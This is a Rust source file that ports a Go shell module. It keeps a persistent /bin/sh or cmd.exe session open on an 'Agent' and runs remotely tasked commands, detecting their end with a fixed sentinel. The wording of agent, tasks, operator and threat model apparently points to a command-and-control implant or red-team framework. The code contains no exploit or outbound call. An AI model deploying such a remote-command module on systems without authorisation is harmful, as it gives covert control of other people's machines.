//! Persistent interactive shell.
//!
//! Port of `NativeShell` and its four sub-verb functions
//! (`shellStartVerb`, `shellExecVerb`, `shellStopVerb`,
//! `shellStatusVerb`), plus the `shellReaderLoop` goroutine.
//!
//! # Structural deviation from Go
//!
//! The Go tree kept shell state in package-level globals
//! (`shellCmd`, `shellStdin`, `shellOutBuf`, `shellReaderWG`,
//! `shellStartTS`). The Rust port keeps the state on `Agent`
//! (`agent.shell`), which is cleaner (no `LazyLock<Mutex>` dance
//! around a half-dozen fields) and equivalent at the call-site
//! level because `native_extra_verb` already takes `&mut Agent`.
//!
//! # Wire-identical behaviour
//!
//! The sentinel `__T2_SHELL_DONE__` is fixed (not per-invocation),
//! the 4 MiB buffer cap drops the oldest half on overflow, and
//! post-sentinel output is preserved for the next exec. All three
//! match the Go implementation's behaviour exactly.
//!
//! The fixed sentinel is a real (if unlikely) collision risk — a
//! command whose output contains `__T2_SHELL_DONE__` would trigger
//! early. The framework's threat model already treats shell as
//! high-signal; an operator worried about the collision can avoid
//! `echo __T2_SHELL_DONE__` in a shell session. A random
//! sentinel per invocation would close the risk at the cost of a
//! per-invocation nonce on the wire; not worth the change.

use std::sync::Arc;
use std::time::{Duration, Instant};

use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::{Child, ChildStdin, ChildStdout, ChildStderr};
use tokio::sync::Mutex;

use crate::core::agent::Agent;
use crate::core::helpers::encode_output;
use crate::protocol::{Task, TaskResult};

const SHELL_SENTINEL: &str = "__T2_SHELL_DONE__";
const SHELL_OUT_CAP: usize = 4 * 1024 * 1024;

/// A running shell process and its I/O state.
pub struct ShellState {
    child: Child,
    stdin: ChildStdin,
    /// Shared output buffer. The reader task appends; the exec
    /// path scans and drains.
    buffer: Arc<Mutex<Vec<u8>>>,
    started_at: Instant,
    /// `/bin/sh` on Unix, `cmd.exe` on Windows. Kept for the
    /// `status` diagnostic.
    command: String,
}

impl ShellState {
    pub fn uptime(&self) -> Duration {
        self.started_at.elapsed()
    }
    pub fn command(&self) -> &str {
        &self.command
    }
    pub fn pid(&self) -> Option<u32> {
        self.child.id()
    }
    pub async fn is_alive(&mut self) -> bool {
        matches!(self.child.try_wait(), Ok(None))
    }
}

pub async fn shell(agent: &mut Agent, task: &Task) -> TaskResult {
    if task.args.is_empty() {
        return err(task, "shell <start|exec|stop|status>");
    }
    match task.args[0].as_str() {
        "start" => start(agent, task).await,
        "exec" => {
            if task.args.len() < 2 {
                return err(task, "shell exec requires a command");
            }
            let cmd = task.args[1..].join(" ");
            exec(agent, task, &cmd).await
        }
        "stop" => stop(agent, task).await,
        "status" => status(agent, task).await,
        other => err(
            task,
            &format!("unknown shell subcommand: {other}"),
        ),
    }
}

async fn start(agent: &mut Agent, task: &Task) -> TaskResult {
    // Already running?
    if let Some(s) = agent.shell.as_mut() {
        if s.is_alive().await {
            let pid = s.pid().unwrap_or(0);
            return ok(
                task,
                format!("shell already running (pid {pid})\n")
                    .as_bytes(),
            );
        }
    }

    let (shell_cmd, shell_args): (&str, &[&str]) = if cfg!(windows) {
        ("cmd.exe", &["/Q"])
    } else {
        ("/bin/sh", &["-s"])
    };

    let mut cmd = tokio::process::Command::new(shell_cmd);
    cmd.args(shell_args);
    cmd.envs(
        crate::native::env::sanitized_env()
            .into_iter()
            .map(|(k, v)| (k, v)),
    );
    cmd.stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => {
            return err(task, &format!("shell start: {e}"))
        }
    };
    let stdin = match child.stdin.take() {
        Some(s) => s,
        None => {
            return err(task, "shell start: stdin pipe");
        }
    };
    let stdout = match child.stdout.take() {
        Some(s) => s,
        None => return err(task, "shell start: stdout pipe"),
    };
    let stderr = match child.stderr.take() {
        Some(s) => s,
        None => return err(task, "shell start: stderr pipe"),
    };

    let buffer: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));
    spawn_reader(stdout, buffer.clone());
    spawn_reader_err(stderr, buffer.clone());

    let pid = child.id().unwrap_or(0);
    agent.shell = Some(ShellState {
        child,
        stdin,
        buffer,
        started_at: Instant::now(),
        command: shell_cmd.to_string(),
    });
    ok(
        task,
        format!("shell started: pid={pid} {shell_cmd}\n")
            .as_bytes(),
    )
}

async fn exec(agent: &mut Agent, task: &Task, cmd_line: &str) -> TaskResult {
    let Some(s) = agent.shell.as_mut() else {
        return err(
            task,
            "shell: no running shell — use `shell start` first",
        );
    };

    // Reset buffer before sending so we only see this
    // command's output.
    s.buffer.lock().await.clear();

    let (payload, sentinel) = if cfg!(windows) {
        (
            format!("{cmd_line}\r\n"),
            format!("echo {SHELL_SENTINEL}\r\n"),
        )
    } else {
        (
            format!("{cmd_line}\n"),
            format!("echo {SHELL_SENTINEL}\n"),
        )
    };

    if let Err(e) = s
        .stdin
        .write_all(format!("{payload}{sentinel}").as_bytes())
        .await
    {
        return err(task, &format!("shell: write: {e}"));
    }

    let deadline = Instant::now() + Duration::from_secs(120);
    loop {
        if Instant::now() > deadline {
            return err(
                task,
                "shell: command timed out after 120s. \
                 Use `shell stop` to close it.",
            );
        }
        let snapshot = { s.buffer.lock().await.clone() };
        if let Some(idx) = find_subslice(&snapshot, SHELL_SENTINEL.as_bytes())
        {
            let mut out = snapshot[..idx].to_vec();
            // Trim trailing CR/LF from output.
            while matches!(out.last(), Some(b'\r') | Some(b'\n')) {
                out.pop();
            }
            // Preserve any output after the sentinel for the
            // next exec.
            let after_start = idx + SHELL_SENTINEL.len();
            let mut after = snapshot[after_start..].to_vec();
            while matches!(after.first(), Some(b'\r') | Some(b'\n')) {
                after.remove(0);
            }
            {
                let mut buf = s.buffer.lock().await;
                *buf = after;
            }
            if out.is_empty() {
                out.extend_from_slice(b"(no output)\n");
            } else {
                out.push(b'\n');
            }
            return ok(task, &out);
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}

async fn stop(agent: &mut Agent, task: &Task) -> TaskResult {
    let Some(mut s) = agent.shell.take() else {
        return ok(task, b"shell not running\n");
    };
    let exit_line: &[u8] = if cfg!(windows) {
        b"exit\r\n"
    } else {
        b"exit\n"
    };
    let _ = s.stdin.write_all(exit_line).await;
    // Give the shell up to 3s to exit cleanly.
    let wait = tokio::time::timeout(
        Duration::from_secs(3),
        s.child.wait(),
    )
    .await;
    if wait.is_err() {
        let _ = s.child.start_kill();
        let _ = s.child.wait().await;
    }
    let ran = s.uptime().as_secs();
    ok(
        task,
        format!("shell stopped (ran {ran}s)\n").as_bytes(),
    )
}

async fn status(agent: &mut Agent, task: &Task) -> TaskResult {
    let Some(s) = agent.shell.as_mut() else {
        return ok(task, b"shell not running\n");
    };
    if !s.is_alive().await {
        agent.shell = None;
        return ok(task, b"shell not running\n");
    }
    let pid = s.pid().unwrap_or(0);
    let uptime = s.uptime().as_secs();
    ok(
        task,
        format!("shell running: pid={pid} uptime={uptime}s\n")
            .as_bytes(),
    )
}

fn spawn_reader(stdout: ChildStdout, buffer: Arc<Mutex<Vec<u8>>>) {
    tokio::spawn(async move {
        let mut reader = BufReader::new(stdout);
        let mut buf = [0u8; 4096];
        loop {
            match tokio::io::AsyncReadExt::read(&mut reader, &mut buf)
                .await
            {
                Ok(0) => break,
                Ok(n) => {
                    let mut b = buffer.lock().await;
                    b.extend_from_slice(&buf[..n]);
                    if b.len() > SHELL_OUT_CAP {
                        let drop = b.len() / 2;
                        b.drain(..drop);
                    }
                }
                Err(_) => break,
            }
        }
    });
}

fn spawn_reader_err(stderr: ChildStderr, buffer: Arc<Mutex<Vec<u8>>>) {
    tokio::spawn(async move {
        let mut reader = BufReader::new(stderr);
        let mut buf = [0u8; 4096];
        loop {
            match tokio::io::AsyncReadExt::read(&mut reader, &mut buf)
                .await
            {
                Ok(0) => break,
                Ok(n) => {
                    let mut b = buffer.lock().await;
                    b.extend_from_slice(&buf[..n]);
                    if b.len() > SHELL_OUT_CAP {
                        let drop = b.len() / 2;
                        b.drain(..drop);
                    }
                }
                Err(_) => break,
            }
        }
    });
}

fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || haystack.len() < needle.len() {
        return None;
    }
    haystack
        .windows(needle.len())
        .position(|w| w == needle)
}

fn ok(task: &Task, payload: &[u8]) -> TaskResult {
    TaskResult {
        id: task.id.clone(),
        output: encode_output(payload),
        ..Default::default()
    }
}

fn err(task: &Task, msg: &str) -> TaskResult {
    TaskResult {
        id: task.id.clone(),
        error: Some(msg.to_string()),
        ..Default::default()
    }
}

// Silence unused warnings for child handles that are only used
// implicitly by the reader task lifetime.
#[allow(dead_code)]
fn _unused(_: &Child) {}